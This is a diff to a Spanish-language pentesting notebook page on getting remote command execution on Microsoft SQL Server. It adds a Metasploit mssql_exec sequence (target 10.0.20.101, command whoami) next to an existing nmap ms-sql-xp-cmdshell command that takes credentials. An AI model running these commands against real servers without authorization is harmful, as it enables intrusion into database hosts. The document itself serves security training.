@@ -35,6 +35,8 @@ exploit
 
 ## RCE
 
+### Nmap
+
 Podemos hacer un RCE si tenemos credenciales de acceso y los permisos necesarios. Usaremos un script de nmap para ello:
 
 {% hint style="success" %}
@@ -46,3 +48,21 @@ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=usuario,ms
 ```
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+### Metasploit
+
+Otra de las opciones es hacer el RCE mediante este modulo de metasploit:
+
+```perl
+msfconsole
+
+use auxiliary/admin/mssql/mssql_exec
+
+set RHOSTS 10.0.20.101
+
+set CMD whoami
+
+exploit
+```
+
+<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
